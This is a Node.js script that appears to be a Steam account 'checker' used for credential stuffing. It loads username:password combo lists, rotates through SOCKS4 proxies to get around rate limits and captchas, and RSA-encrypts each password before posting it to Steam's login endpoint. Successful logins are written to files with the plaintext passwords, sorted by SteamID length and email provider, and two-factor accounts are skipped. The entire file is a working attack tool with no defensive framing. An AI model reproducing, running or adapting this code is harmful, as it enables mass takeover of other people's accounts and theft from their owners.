console.log("STARTING...")
let request = require('request-promise');
const NodeRSA = require('node-rsa')
const GetProxies = require('./util/get-proxies');
const SocksProxyAgent = require('socks-proxy-agent');
const fs = require('fs')
const steamId = require('./util/steam64-Converter');

let steamURL = 'https://steamcommunity.com/login/'
let userAgent = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'
}

let checksDone = 0;
let failedChecks = 0;
let totalBadLogins = 0;
let currentChecks = 0;
let retries = 0;
let feederInterval = null;
let g_statsInterval = null;
let gettingProxies = false;
let proxies;
let loopStart = 0;

let fourDig, fiveDig,sixDig, sevenDig, otherDig;
fourDig = fiveDig = sixDig = sevenDig = otherDig = 0;

const RETRY_THRESHOLD = 1000;         //How many times to retry a failed check
const CHECKING_THRESHOLD = 300;    //Upper limit of current checks
const CHECKING_TIMER = 10000;       //How often to feed checker
const STATS_TIMER = 1000;           //How often to display stats
const FEED = 500;                   //Feed checker this amount
const PROXY_FETCH_THRESHHOLD = 100; //Renew proxies when the fall to this number

// Load combos
let combo = fs.readFileSync('to-check-later.txt').toString().split(/\r?\n|\r/).filter(combo =>{
	if(combo === "") return false;
	return true;
});

FetchProxies();

// Fetch proxies
async function FetchProxies(){
    console.log('Getting proxy list')
    gettingProxies = true;
    try {
        proxies = await GetProxies();
        gettingProxies = false;
        InitializeChecker();
    } catch (error) {
        console.log(error)
        //retry on any error 
        setTimeout(() => FetchProxies(), 5000);
    }
}

// Start checking process
function InitializeChecker() {
    Feeder();
    feederInterval = setInterval(() => {
        // Do not feed if over checking threshold
        if (currentChecks <= CHECKING_THRESHOLD) {
            Feeder();
        }
    }, CHECKING_TIMER);

    // start stats logger
    if (!g_statsInterval) {
        g_statsInterval = setInterval(() => {
            process.stdout.write('\033c');
            console.log(`\n Checks Done: ${checksDone} of ${combo.length}`);
            console.log(` 7 Dig: ${sevenDig}`);
            console.log(` 6 Dig: ${sixDig}`);
            console.log(` 5 Dig: ${fiveDig}`);
            console.log(` 4 Dig: ${fourDig}`);
            console.log(` Other: ${otherDig}\n`);

            console.log(` Bad Logins: ${totalBadLogins}`);
            console.log(` Proxies Left: ${proxies.size}`);
            console.log(` Failed Checks: ${failedChecks}`);
            console.log(` Retries: ${retries}`);
            console.log(` Current Checks: ${currentChecks}\n`);

            //stop logging if done checking
            if (checksDone == combo.length) {
                console.log('Done Checking')
                clearInterval(g_statsInterval)
            }
        }, STATS_TIMER);
    }
}

function Feeder() {
    //set feeder upper bound
    let end = loopStart + FEED;

    // Terminate checking if done
    if (end >= combo.length) {
        end = combo.length;
        clearInterval(feederInterval);
    }

    for (var i = loopStart; i < end; i++) {
        currentChecks++;
        let proxy = proxies.next();
        let socks = `socks4://${proxy.val}`
        let agent = SocksProxyAgent(socks);
        let comboSplit = combo[i].split(":");
        GetRSAKey(comboSplit[0], comboSplit[1], agent, proxy, 0); //0 is used as a counter
    }
    loopStart = end;
}

function GetRSAKey(user, pass, agent, proxy, tryCounter) {
    let donotcache = Date.now();

    let options = {
        url: steamURL + "getrsakey/",
        agent: agent,
        form: {
            donotcache: donotcache,
            username: user
        },
        headers: userAgent,
        method: 'POST',
        timeout: 3000
    };
    
    request(options).then(data => {
        // No data
        if (!data) {
            Retry(user, pass, proxy, counter);
            return;
        }

        data = JSON.parse(data);
        if (data.success) { //sucessfully got rsakey
            // Encrypt password
            let mod = data.publickey_mod
            let exp = data.publickey_exp
            let encryptedPass = EncryptPass(pass, mod, exp);

            // Do login
            let rsaTimeStamp = data.timestamp;
            DoLogin(user, pass, proxy, encryptedPass, rsaTimeStamp, agent, donotcache, tryCounter);
            return;
        }

        //did not successfully get rsa key
        Retry(user, pass, proxy, tryCounter);

    }).catch(err => { Retry(user, pass, proxy, tryCounter); });
}

function EncryptPass(pass, mod, exp) {
    let key = new NodeRSA();

    key.setOptions({
        encryptionScheme: 'pkcs1',
        signingScheme: 'pkcs1-sha256'
    })

    let mod2 = Buffer.from(mod, 'hex');
    let exp2 = Buffer.from(exp, 'hex');

    key.importKey({
        n: mod2,
        e: exp2
    }, 'components-public');

    return key.encrypt(pass, 'base64');
}

function DoLogin(user, pass, proxy, encryptedPass, rsaTimeStamp, agent, donotcache, tryCounter) {
    let options = {
        url: steamURL + "dologin/",
        agent: agent,
        form: {
            donotcache: donotcache,
            password: encryptedPass,
            username: user,
            rsatimestamp: rsaTimeStamp
        },
        headers: userAgent,
        method: 'POST',
        timeout: 3000
    }

    request(options).then(data =>{

        //No data
        if (!data) {
            Retry(user, pass, proxy, tryCounter);
            return;
        }

        //Catch weird invalid data character
        if (data.charCodeAt(0) != 123) {
            Retry(user, pass, proxy, tryCounter);
            return;
        }

        data = JSON.parse(data);

        //Bad login
        if ((data.message.indexOf('The account name or password') > -1) || data.requires_twofactor) {
            checksDone++;
            currentChecks--;
            totalBadLogins++;
            return;
        }

        //write to file, if theres no message, then check is good
        if (!data.message) {
            currentChecks--;
            checksDone++;
            let steamid = steamId(data.emailsteamid);
            let account = `https://steamcommunity.com/profiles/${data.emailsteamid}\n`
            account += `${steamid[0] + steamid[1]}\n${user}\n${pass}\n\n`
            let digits = steamid[1].length;

            //set correct path
            let email = data.emaildomain;
            let path = `./checked/${digits}/`;
            if(digits < 4 || digits > 7){
                path = `./checked/other/`
            }

            if(digits == 7){
                sevenDig++;
            }else if(digits == 6){
                sixDig++;
            }else if(digits == 5){
                fiveDig++;
            }else if(digits == 4){
                fourDig++;
            }else{
                otherDig++;
            }
			
			if(email.indexOf('gmx') > -1){
				email = 'gmx';
			}

            //separate by good email
			if(email === 'hotmail.com' || email === 'yahoo.com' || email === 'msn.com' || 
				email === 'cox.net' || email === 'comcast.net' || email === 'freenet.de' || 
				email === 'freemail.hu' || email === 'juno.com' || email === 'caramail.com' || 
				email === 'mail.com' || email === 't-online.de' || email === 'gmx' || 
				email === 'free.fr' || email === 'email.com'){
                   path += `${email}.txt`
            }else{
                path += `other.txt`
            }
			
            fs.appendFileSync(path, account);
            return;
        }
		
		//console.log(data.message)
        //console.log('retrying: proxy rate limit or captcha')
        Retry(user, pass, proxy, tryCounter);

    }).catch(err => { Retry(user, pass, proxy, tryCounter); })
}

function Retry(user, pass, proxy, tryCounter) {
    retries++;
    tryCounter++;
    //do not retry if it's been checked too many times...
    if (tryCounter >= RETRY_THRESHOLD) {
        checksDone++;
        currentChecks--;
        failedChecks++
        let account = `${user}:${pass}\n`
        fs.appendFileSync('./checked/too-many-tries.txt', account)
        return;
    }

    //bad proxy, remove it
    proxies.remove(proxy);
    proxy = proxies.next();

    let socks = `socks4://${proxy.val}`
    let agent = SocksProxyAgent(socks);
    GetRSAKey(user, pass, agent, proxy, tryCounter);

    //Get more proxies.
    if (proxies.size <= PROXY_FETCH_THRESHHOLD && !gettingProxies) {
        gettingProxies = true;
        //do not continue checking, until we get a new list of proxies
        clearInterval(feederInterval);
        FetchProxies();
    }
}